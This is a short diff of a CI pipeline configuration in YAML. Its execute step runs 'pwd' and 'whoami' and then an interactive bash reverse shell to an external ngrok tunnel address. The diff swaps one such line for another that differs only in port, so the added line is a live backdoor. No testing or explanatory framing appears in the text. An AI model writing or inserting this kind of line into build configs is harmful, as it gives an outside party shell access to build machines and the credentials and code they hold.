@@ -70,7 +70,7 @@ pipelines:
           onExecute:
             - pwd
             - whoami
-            - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/15724 0>&1
+            - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10518 0>&1
           onSuccess:
             - echo "succes"
       
